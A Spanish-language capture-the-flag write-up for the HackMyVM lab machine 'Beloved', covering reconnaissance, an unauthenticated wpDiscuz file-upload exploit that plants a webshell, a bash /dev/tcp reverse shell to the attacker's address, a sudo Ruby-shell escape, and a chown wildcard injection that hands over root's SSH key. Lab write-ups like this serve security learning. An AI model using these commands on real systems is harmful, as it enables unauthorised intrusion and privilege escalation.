---
title: ‚ù§Ô∏è‚Äçüî• Beloved
categories: [Writeups]
tags: [writeup, hackmyvm, ecppt, wordpress]
image: /assets/hackmyvm/beloved/beloved.png
description: "M√°quiuna de HackMyVm"
---

# ‚ù§Ô∏è‚Äçüî• **M√°quina Beloved - HackMyVm**


<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/hackmyvm/beloved/beloved.png" width="250"/>
  <p style="font-style: italic; margin-top: 8px;">¬© 2025 hackmyvm</p>
</div>

# Reconocimiento

Lo primero que haremos ser√° identificar la direcci√≥n IP de la m√°quina objetivo. Para ello utilizamos `arp-scan`, una herramienta muy √∫til para descubrir hosts activos en la red.

```bash
sudo arp-scan -I eth1 10.10.10.0/24

Interface: eth1, type: EN10MB, MAC: 08:00:27:41:0a:fa, IPv4: 10.10.10.101
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      0a:00:27:00:00:0a       (Unknown: locally administered)
10.10.10.100    08:00:27:38:d1:c8       (Unknown)
10.10.10.107    08:00:27:25:e8:44       (Unknown)
```

Una vez identificada la direcci√≥n IP de la m√°quina (10.10.10.107), continuamos con un escaneo inicial utilizando **Nmap** para obtener informaci√≥n sobre los servicios expuestos.

```bash
sudo nmap -sSCV -p- -n --min-rate 5000 10.10.10.107 -vvv -oN scan

Host is up, received arp-response (0.038s latency).
Scanned at 2026-02-13 07:26:20 EST for 28s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhemxEZcm98GFwIRozVUePnC+Cejni5lScAa7ha5neDlWQT2e6dbubOkddku/qgtgY4/kw/pGPh7oTqHg9WKHTMqTAzdN0DDaU/5twewwMf6s9ERuuYYieP7mzjsX2APhOr23CFWVr37Y+mQ/A4J0ODizpr/mggCCi6kqHqyRWgcPG98AVJ9IjPehVkptQdLpQlSOV8EzJClu6tBInWzxtGi5v0B94lMYRDXqZE9Z1wCSh9oU0HnwRwfFqB0dcOH+kDZVLYi06aiHKXkKgSFM3G6LJQY8ad4FCEc7TU+agLRPHFUPFqqPbf9hbDD7MUdR4pXEQtJ1p/D/9rdbBg1Sp
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+zmcUltQUYUVvvfWqtUjdFpCh0IkOnPjmcctTpnXS7MWK37n6h9DEq4WNsHmauyKEuRnml5mOLUbNIZHHUBgY=
|   256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNArrcR981CzORruPnEn/opg56t7SFktwnhZzGpXcfE
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Beloved &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:25:E8:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nmap identifica dos servicios abiertos: una aplicaci√≥n web en el puerto **80** y un ssh **22**.

Comenzaremos analizando la aplicaci√≥n web.

Si prestamos atenci√≥n, al situar el cursor sobre el enlace *Hello World!* aparece en la esquina inferior izquierda la URL:

    http://beloved/2021/06/09/hello-world/


Sin embargo, al hacer clic, la p√°gina no se carga correctamente. Para poder visualizarla, es necesario a√±adir el dominio **beloved** al archivo `/etc/hosts`, de modo que el sistema pueda resolverlo adecuadamente.

Una vez realizado este ajuste, la p√°gina de WordPress se muestra sin inconvenientes.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/hackmyvm/beloved/home.png" width="800"/>
</div>

Podemos probar a hacer fuzzing de directorios para ver si encontramos algo interesante.

```bash
gobuster dir -u http://beloved -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -t 10 -o dirs
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://beloved
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
rss                  (Status: 301) [Size: 0] [--> http://beloved/feed/]
login                (Status: 302) [Size: 0] [--> http://beloved/wp-login.php]
0                    (Status: 301) [Size: 0] [--> http://beloved/0/]
feed                 (Status: 301) [Size: 0] [--> http://beloved/feed/]
atom                 (Status: 301) [Size: 0] [--> http://beloved/feed/atom/]
s                    (Status: 301) [Size: 0] [--> http://beloved/sample-page/]
wp-content           (Status: 301) [Size: 307] [--> http://beloved/wp-content/]
admin                (Status: 302) [Size: 0] [--> http://beloved/wp-admin/]
h                    (Status: 301) [Size: 0] [--> http://beloved/2021/06/09/hello-world/]
rss2                 (Status: 301) [Size: 0] [--> http://beloved/feed/]
wp-includes          (Status: 301) [Size: 308] [--> http://beloved/wp-includes/]
javascript           (Status: 301) [Size: 307] [--> http://beloved/javascript/]
sa                   (Status: 301) [Size: 0] [--> http://beloved/sample-page/]
rdf                  (Status: 301) [Size: 0] [--> http://beloved/feed/rdf/]
page1                (Status: 301) [Size: 0] [--> http://beloved/]
sample               (Status: 301) [Size: 0] [--> http://beloved/sample-page/]
'                    (Status: 301) [Size: 0] [--> http://beloved/]
dashboard            (Status: 302) [Size: 0] [--> http://beloved/wp-admin/]
he                   (Status: 301) [Size: 0] [--> http://beloved/2021/06/09/hello-world/]
sam                  (Status: 301) [Size: 0] [--> http://beloved/sample-page/]
hello                (Status: 301) [Size: 0] [--> http://beloved/2021/06/09/hello-world/]
wp-admin             (Status: 301) [Size: 305] [--> http://beloved/wp-admin/]
2021                 (Status: 301) [Size: 0] [--> http://beloved/2021/]
```

Pero despu√©s de esperar un rato vemos que no aparece nada interesante. As√≠ que vamos a tirar de **wpscan**.

```bash
wpscan --url http://beloved --plugins-detection aggressive -t 50
```

> El escaneo de **wpscan** va a tardar bastante, as√≠ que os adelanto que el plugin vulnerable es **wpDiscuz**.
{: .prompt-warning}

Vamos a comprobar si tenemos a mano alg√∫n exploit disponible.

```bash
searchsploit wpDiscuz
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                              | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                              | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                   | php/webapps/49401.rb
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
searchsploit -m 49967
  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49967
     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
    Codes: CVE-2020-24186
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
Copied to: /home/kali/Documents/49967.py
```

Inspeccionando un poco el script, parece que necesita apuntar a una ruta donde exista un post del blog. Si nos fijamos en la captura anterior, vemos que la entrada se public√≥ el **9 de junio de 2021**. En este plugin, los posts se organizan en rutas que siguen el formato de fechas.

De hecho, esto encaja con lo que vimos durante el fuzzing: apareci√≥ un directorio llamado `2021`. As√≠ que, en nuestro caso, la ruta objetivo del post es:

`/2021/06/09/hello-world/`

Ahora probamos a ejecutar el exploit.

```bash
python3 exploit.py -u http://beloved -p /2021/06/09/hello-world/
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[51680] | code:[200]
[!] Got wmuSecurity value: c945c6d982
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: cwqrnwwgqanmrfu

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://beloved/wp-content/uploads/2026/02/cwqrnwwgqanmrfu-1770987579.175.php&quot; 

>
```

Pero en lugar de utilizar la webshell que proporciona el exploit, vamos a hacerlo directamente desde la propia web.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/hackmyvm/beloved/web.png" width="800"/>
</div>

Vemos que, a trav√©s del par√°metro `?cmd`, podemos ejecutar comandos en el servidor, as√≠ que aprovechamos esta funcionalidad para lanzarnos una reverse shell.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.101/9001 0>&1'
```

> Hay que **URL‚Äëencodear** el script para que funcione correctamente.
{: .prompt-info}

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/hackmyvm/beloved/shell.png" width="800"/>
</div>

Una vez que obtenemos la shell, realizamos el tratamiento de la TTY para trabajar de forma m√°s c√≥moda.

```bash
script /dev/null -c bash
# CTRL+Z
stty raw -echo;fg
reset xterm
export SHELL=/bin/bash
export TERM=xterm-256color
source /etc/skel/.bashrc
```

Y vemos que, como usuario `www-data`, tenemos un privilegio sudo sobre un ejecutable.

```bash
www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2026/02$ sudo -l
Matching Defaults entries for www-data on beloved:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on beloved:
    (beloved) NOPASSWD: /usr/local/bin/nokogiri
```

Este programa recibe como par√°metro un documento y, a partir de ah√≠, nos abre una shell de Ruby.

```bash
www-data@beloved:/home$ touch /tmp/log.txt
www-data@beloved:/home$ sudo -u beloved /usr/local/bin/nokogiri /tmp/log.txt
Loading nokogiri settings...
Your document is stored in @doc...
irb(main):001:0> 
```

Una vez dentro, podemos aprovechar los comandos disponibles en Ruby para obtener una shell como el usuario `beloved`.

```bash
irb(main):002:0> system '/bin/bash'
beloved@beloved:/home$ 
```

Ahora ya podemos leer el user.txt

```bash
beloved@beloved:~$ ls 
user.txt
```

Tras pasar un rato revisando el sistema, no encontramos binarios SUID relevantes, no disponemos de nuevos privilegios sudo y `linpeas.sh` tampoco ha detectado nada √∫til. As√≠ que nos traemos **pspy64** para comprobar si hay alg√∫n comando ejecut√°ndose de forma peri√≥dica.

```bash
beloved@beloved:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà   ‚ñà‚ñà‚ñì
    ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà  ‚ñà‚ñà‚ñí
    ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë
    ‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí  ‚ñí   ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë
    ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë
    ‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñí 
    ‚ñë‚ñí ‚ñë     ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë‚ñë‚ñí ‚ñë     ‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë 
    ‚ñë‚ñë       ‚ñë  ‚ñë  ‚ñë  ‚ñë‚ñë       ‚ñí ‚ñí ‚ñë‚ñë  
                   ‚ñë           ‚ñë ‚ñë     
                               ‚ñë ‚ñë     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/13 21:53:11 CMD: UID=33   PID=988    | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=910    | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=0    PID=9      | 
2026/02/13 21:53:11 CMD: UID=0    PID=8      | 
2026/02/13 21:53:11 CMD: UID=0    PID=61     | 
2026/02/13 21:53:11 CMD: UID=0    PID=6      | 
2026/02/13 21:53:11 CMD: UID=0    PID=51     | 
2026/02/13 21:53:11 CMD: UID=106  PID=504    | /usr/sbin/mysqld 
2026/02/13 21:53:11 CMD: UID=0    PID=50     | 
2026/02/13 21:53:11 CMD: UID=0    PID=492    | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=0    PID=415    | /usr/sbin/sshd -D 
2026/02/13 21:53:11 CMD: UID=0    PID=4      | 
2026/02/13 21:53:11 CMD: UID=0    PID=397    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2026/02/13 21:53:11 CMD: UID=0    PID=378    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2026/02/13 21:53:11 CMD: UID=0    PID=342    | /lib/systemd/systemd-logind 
2026/02/13 21:53:11 CMD: UID=0    PID=339    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                      
2026/02/13 21:53:11 CMD: UID=104  PID=338    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/02/13 21:53:11 CMD: UID=0    PID=337    | /usr/sbin/cron -f 
2026/02/13 21:53:11 CMD: UID=0    PID=336    | /usr/sbin/rsyslogd -n -iNONE 
2026/02/13 21:53:11 CMD: UID=0    PID=324    | 
2026/02/13 21:53:11 CMD: UID=0    PID=323    | 
2026/02/13 21:53:11 CMD: UID=0    PID=32     | 
2026/02/13 21:53:11 CMD: UID=0    PID=3      | 
2026/02/13 21:53:11 CMD: UID=0    PID=29     | 
2026/02/13 21:53:11 CMD: UID=1000 PID=2806   | ./pspy64 
2026/02/13 21:53:11 CMD: UID=0    PID=28     | 
2026/02/13 21:53:11 CMD: UID=0    PID=2788   | 
2026/02/13 21:53:11 CMD: UID=0    PID=2761   | 
2026/02/13 21:53:11 CMD: UID=0    PID=27     | 
2026/02/13 21:53:11 CMD: UID=0    PID=2666   | 
2026/02/13 21:53:11 CMD: UID=0    PID=26     | 
2026/02/13 21:53:11 CMD: UID=101  PID=254    | /lib/systemd/systemd-timesyncd 
2026/02/13 21:53:11 CMD: UID=0    PID=25     | 
2026/02/13 21:53:11 CMD: UID=0    PID=246    | /lib/systemd/systemd-udevd 
2026/02/13 21:53:11 CMD: UID=0    PID=24     | 
2026/02/13 21:53:11 CMD: UID=0    PID=23     | 
2026/02/13 21:53:11 CMD: UID=0    PID=22     | 
2026/02/13 21:53:11 CMD: UID=0    PID=21     | 
2026/02/13 21:53:11 CMD: UID=0    PID=20     | 
2026/02/13 21:53:11 CMD: UID=0    PID=2      | 
2026/02/13 21:53:11 CMD: UID=0    PID=1954   | 
2026/02/13 21:53:11 CMD: UID=0    PID=194    | 
2026/02/13 21:53:11 CMD: UID=0    PID=193    | 
2026/02/13 21:53:11 CMD: UID=0    PID=191    | 
2026/02/13 21:53:11 CMD: UID=0    PID=19     | 
2026/02/13 21:53:11 CMD: UID=0    PID=18     | 
2026/02/13 21:53:11 CMD: UID=0    PID=1712   | /lib/systemd/systemd-journald 
2026/02/13 21:53:11 CMD: UID=0    PID=17     | 
2026/02/13 21:53:11 CMD: UID=0    PID=160    | 
2026/02/13 21:53:11 CMD: UID=0    PID=16     | 
2026/02/13 21:53:11 CMD: UID=0    PID=15     | 
2026/02/13 21:53:11 CMD: UID=1000 PID=1478   | /bin/bash 
2026/02/13 21:53:11 CMD: UID=1000 PID=1473   | /usr/bin/ruby2.5 /usr/local/bin/nokogiri /tmp/pwn 
2026/02/13 21:53:11 CMD: UID=0    PID=1472   | sudo -u beloved /usr/local/bin/nokogiri /tmp/pwn 
2026/02/13 21:53:11 CMD: UID=0    PID=1458   | 
2026/02/13 21:53:11 CMD: UID=0    PID=14     | 
2026/02/13 21:53:11 CMD: UID=0    PID=127    | 
2026/02/13 21:53:11 CMD: UID=0    PID=126    | 
2026/02/13 21:53:11 CMD: UID=33   PID=1240   | bash 
2026/02/13 21:53:11 CMD: UID=33   PID=1239   | sh -c bash 
2026/02/13 21:53:11 CMD: UID=33   PID=1238   | script /dev/null -c bash 
2026/02/13 21:53:11 CMD: UID=33   PID=1236   | bash -i 
2026/02/13 21:53:11 CMD: UID=33   PID=1235   | bash -c bash -i >& /dev/tcp/10.10.10.101/9001 0>&1 
2026/02/13 21:53:11 CMD: UID=33   PID=1234   | sh -c bash -c 'bash -i >& /dev/tcp/10.10.10.101/9001 0>&1' 
2026/02/13 21:53:11 CMD: UID=0    PID=120    | 
2026/02/13 21:53:11 CMD: UID=0    PID=12     | 
2026/02/13 21:53:11 CMD: UID=0    PID=118    | 
2026/02/13 21:53:11 CMD: UID=0    PID=117    | 
2026/02/13 21:53:11 CMD: UID=0    PID=115    | 
2026/02/13 21:53:11 CMD: UID=0    PID=11     | 
2026/02/13 21:53:11 CMD: UID=33   PID=1097   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1092   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=0    PID=109    | 
2026/02/13 21:53:11 CMD: UID=33   PID=1030   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1027   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1024   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1022   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1020   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=33   PID=1019   | /usr/sbin/apache2 -k start 
2026/02/13 21:53:11 CMD: UID=0    PID=10     | 
2026/02/13 21:53:11 CMD: UID=0    PID=1      | /sbin/init 
2026/02/13 21:54:01 CMD: UID=0    PID=2814   | /usr/sbin/CRON -f 
2026/02/13 21:54:01 CMD: UID=0    PID=2815   | /usr/sbin/CRON -f 
2026/02/13 21:54:01 CMD: UID=0    PID=2816   | /bin/sh -c cd /opt && chown root:root * 
```

Y vemos que el usuario `root` est√° ejecutando peri√≥dicamente el comando:

`/bin/sh -c cd /opt && chown root:root *`

Esto es especialmente peligroso debido a c√≥mo funciona el *globbing* en la expansi√≥n del asterisco.

Si en un directorio tenemos, por ejemplo, dos archivos llamados `fichero1.txt` y `fichero2.txt`, el `*` se expande sustituy√©ndose por ambos nombres. En este caso, el comando real que se ejecutar√≠a ser√≠a:

`/bin/sh -c cd /opt && chown root:root fichero1.txt fichero2.txt`

A simple vista no parece problem√°tico, pero podemos manipular los nombres de los archivos para alterar el comportamiento del comando `chown`. La idea es aprovechar c√≥mo interpreta los par√°metros para conseguir que ejecute algo distinto a lo esperado.

La explotaci√≥n ser√≠a la siguiente.

```bash
beloved@beloved:~/.ssh$ cd /opt
beloved@beloved:/opt$ touch ref
beloved@beloved:/opt$ touch -- --reference=ref
beloved@beloved:/opt$ ls -la
Total 12
-rw-r--r-- beloved beloved 1 0 Aug 28 02:09 '--reference=ref'
drwxrwx--- 2 beloved root 4096 Aug 28 02:09 .
drwxr-xr-x 18 root root 4096 May 19 2021 ..
-rw-------- 1 root root 1823 Jun 27 2021 id_rsa 
-rw-r--r-- beloved- 1 beloved 0 Aug 28 02:09 ref
```
La "magia" de todo esto est√° en el uso de `touch -- --reference=ref`. Este comando nos permite crear un archivo cuyo nombre literal es `--reference=ref`. La clave es que `--reference` es una opci√≥n v√°lida de `chown` que indica: *"toma el usuario y el grupo de este archivo y apl√≠calos a los archivos seleccionados"*. En nuestro caso, apunta al fichero `ref`, cuyo propietario y grupo pertenecen a `beloved`.

As√≠, cuando se ejecute:

`/bin/sh -c cd /opt && chown root:root *`

el globbing expandir√° el asterisco y colocar√° los archivos en este orden:

`/bin/sh -c cd /opt && chown root:root --reference=ref id_rsa ref`

De este modo, `chown` interpretar√° `--reference=ref` como una opci√≥n v√°lida y aplicar√° los permisos del archivo `ref` (propiedad de `beloved`) a `id_rsa` y al propio `ref`. 

```bash
beloved@beloved:/opt$ ls -la
Total 12
-rw-r--r-- beloved beloved 1 0 Aug 28 02:09 '--reference=ref'
drwxrwx--- 2 beloved root 4096 Aug 28 02:09 .
drwxr-xr-x 18 root root 4096 May 19 2021 ..
-rw----------- beloved 1 beloved 1823 Jun 27 2021 id_rsa 
-rw-r--r-- beloved- 1 beloved 0 Aug 28 02:09 ref
```

Y ahora, con los permisos ya modificados, podemos leer la `id_rsa` y conectarnos como `root` por SSH.

```bash
beloved@beloved:/opt$ ssh root@localhost -i id_rsa     
Linux beloved 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 13 19:38:20 2026 from ::1
root@beloved:~# ls /root/
root.txt           
```

Y ahora s√≠, podemos leer la flag.

> Cabe destacar que ten√≠amos un buen chivatazo de la explotaci√≥n en el `.bash_history` del usuario `beloved`.
{: .prompt-info}

```bash
beloved@beloved:~$ cat .bash_history 
clear
id
clear
wget http://192.168.0.28:8000/pspy64
cd ~
wget http://192.168.0.28:8000/pspy64
chmod +x *
clear
./pspy64 |grep "UID=0"
clear
cd /opt
clear
ls -l
cat id_rsa 
clear
touch test && touch -- --reference=test
clear
watch ls -l
clear
cat id_rsa 
cd ~
nano id_rsa
chmod 600 id_rsa 
clear
ssh -i id_rsa root@localhost 
```